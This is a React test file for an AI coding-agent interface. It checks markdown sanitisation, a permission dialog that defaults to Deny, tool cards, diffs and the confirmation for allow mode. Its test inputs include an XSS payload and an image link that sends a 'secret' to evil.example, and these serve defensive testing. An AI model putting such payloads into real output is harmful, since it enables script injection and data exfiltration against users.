import { afterEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { Markdown } from "../src/components/Markdown";
import { PermissionDialog } from "../src/components/PermissionDialog";
import { AskCard } from "../src/components/AskCard";
import { ToolCard } from "../src/components/ToolCard";
import { DiffView } from "../src/components/DiffView";
import { ConfirmAllow } from "../src/components/ConfirmAllow";
import type { Info } from "../src/protocol";
import { initialState, useStore } from "../src/store";

afterEach(() => {
  cleanup();
  useStore.setState({ ...initialState });
});

describe("Markdown from a model is not trusted", () => {
  it("does not turn raw HTML into elements", () => {
    const { container } = render(<Markdown text={'hello <img src=x onerror="alert(1)"> <script>alert(1)</script> <b>bold</b>'} />);
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
  });

  it("does not load images, and opens links safely", () => {
    const { container } = render(<Markdown text={"![tracker](https://evil.example/p.gif?d=secret) [site](https://example.com)"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[image: tracker]");
    const a = container.querySelector("a")!;
    expect(a.getAttribute("target")).toBe("_blank");
    expect(a.getAttribute("rel")).toContain("noopener");
  });

  it("highlights code without parsing it as HTML", () => {
    const { container } = render(<Markdown text={"```python\nprint('<b>x</b>')\n```"} />);
    expect(container.querySelector("code")?.textContent).toContain("<b>x</b>");
    expect(container.querySelector("code b")).toBeNull();
  });
});

describe("PermissionDialog", () => {
  const request = { id: "q1", title: "run a command", display: ["bash:", "    $ rm big.txt"], findings: ["a run of 40 spaces"], reasons: ["rm deletes files"], note: null, kind: "bash" };

  it("shows the exact action, the hidden-character warning and the reason", () => {
    useStore.setState({ permission: request });
    render(<PermissionDialog />);
    expect(screen.getByText(/rm big.txt/)).toBeTruthy();
    expect(screen.getByText(/Hidden: a run of 40 spaces/)).toBeTruthy();
    expect(screen.getByText("rm deletes files")).toBeTruthy();
  });

  it("focuses Deny, and only a click on Allow approves", () => {
    const answer = vi.fn();
    useStore.setState({ permission: request, answerPermission: answer });
    render(<PermissionDialog />);
    expect(document.activeElement).toBe(screen.getByText("Deny"));
    fireEvent.keyDown(document.activeElement!, { key: "Enter" });
    expect(answer).not.toHaveBeenCalled();
    fireEvent.click(screen.getByText("Allow"));
    expect(answer).toHaveBeenCalledWith(true);
  });

  it("denies on Escape and on the Deny button", () => {
    const answer = vi.fn();
    useStore.setState({ permission: request, answerPermission: answer });
    render(<PermissionDialog />);
    fireEvent.keyDown(window, { key: "Escape" });
    fireEvent.click(screen.getByText("Deny"));
    expect(answer.mock.calls).toEqual([[false], [false]]);
  });

  it("renders nothing when there is no question", () => {
    const { container } = render(<PermissionDialog />);
    expect(container.firstChild).toBeNull();
  });
});

describe("AskCard", () => {
  it("offers numbered choices and sends the one picked", () => {
    const answer = vi.fn();
    useStore.setState({ ask: { id: "a", question: "Python or Go?", choices: ["Python", "Go"] }, answerAsk: answer });
    render(<AskCard />);
    expect(screen.getByText("Python or Go?")).toBeTruthy();
    fireEvent.click(screen.getByText("Go"));
    expect(answer).toHaveBeenCalledWith("Go");
  });

  it("takes a typed answer, and Skip sends none", () => {
    const answer = vi.fn();
    useStore.setState({ ask: { id: "a", question: "Name?", choices: [] }, answerAsk: answer });
    render(<AskCard />);
    fireEvent.change(screen.getByPlaceholderText("Your answer"), { target: { value: "Ada" } });
    fireEvent.click(screen.getByText("Send"));
    fireEvent.click(screen.getByText("Skip"));
    expect(answer.mock.calls).toEqual([["Ada"], [null]]);
  });
});

describe("ToolCard", () => {
  const item = { kind: "tool" as const, id: "t", name: "write_file", display: "write_file(a.py, 5 chars)", input: { path: "a.py", content: "x" }, result: "Created a.py", isError: false, status: "done" as const };

  it("expands to show input and result, and links a written file to its diff", () => {
    render(<ToolCard item={item} />);
    expect(screen.queryByText("Created a.py")).toBeNull();
    fireEvent.click(screen.getByText("write_file(a.py, 5 chars)"));
    expect(screen.getByText("Created a.py")).toBeTruthy();
    fireEvent.click(screen.getByText("View diff"));
    expect(useStore.getState().rightTab).toBe("changes");
    expect(useStore.getState().selectedChange).toBe("a.py");
  });

  it("shows the first line of an error under the row, and the +/- counts of a write", () => {
    useStore.setState({ changes: { "a.py": { before: "x\n", after: "y\nz\n" } } });
    const { container } = render(<ToolCard item={item} />);
    expect(container.querySelector(".tool-outcome")?.textContent).toBe("+2 −1");
    cleanup();
    render(<ToolCard item={{ ...item, isError: true, result: "Could not write a.py.\nTry again." }} />);
    expect(screen.getByText("Could not write a.py.")).toBeTruthy();
  });

  it("keeps the input behind Show input", () => {
    render(<ToolCard item={item} />);
    fireEvent.click(screen.getByText("write_file(a.py, 5 chars)"));
    expect(screen.queryByText(/"content"/)).toBeNull();
    fireEvent.click(screen.getByText("Show input"));
    expect(screen.getByText(/"content"/)).toBeTruthy();
  });

  it("marks failures", () => {
    const { container } = render(<ToolCard item={{ ...item, isError: true, result: "Not run" }} />);
    expect(container.querySelector(".tool.error")).not.toBeNull();
    expect(screen.queryByText("View diff")).toBeNull();
  });
});

describe("DiffView", () => {
  it("shows additions and removals with counts", () => {
    const { container } = render(<DiffView path="a.py" before={"x = 1\n"} after={"x = 2\n"} />);
    expect(container.querySelectorAll(".row.add")).toHaveLength(1);
    expect(container.querySelectorAll(".row.del")).toHaveLength(1);
    expect(screen.getByText("modified")).toBeTruthy();
  });
});

describe("Allow mode needs a confirmation", () => {
  const info = { permissions: "ask", modes: ["ask", "judge", "allow"], mode_help: {} } as unknown as Info;

  it("is only turned on by a click on Turn on Allow", () => {
    const turnOn = vi.fn();
    useStore.setState({ info, confirmAllow: true, confirmAllowMode: turnOn });
    render(<ConfirmAllow />);
    expect(document.activeElement).toBe(screen.getByText("Keep ask"));
    fireEvent.click(screen.getByText("Turn on Allow"));
    expect(turnOn).toHaveBeenCalledTimes(1);
  });

  it("keeps the old mode on Escape and on Enter", () => {
    const turnOn = vi.fn();
    useStore.setState({ info, confirmAllow: true, confirmAllowMode: turnOn });
    render(<ConfirmAllow />);
    fireEvent.keyDown(document.activeElement!, { key: "Enter" });
    expect(useStore.getState().confirmAllow).toBe(false);
    act(() => useStore.setState({ confirmAllow: true }));
    fireEvent.keyDown(window, { key: "Escape" });
    expect(useStore.getState().confirmAllow).toBe(false);
    expect(turnOn).not.toHaveBeenCalled();
  });

  it("is what /permissions allow opens", () => {
    useStore.setState({ info });
    useStore.getState().submit("/permissions allow");
    expect(useStore.getState().confirmAllow).toBe(true);
  });
});
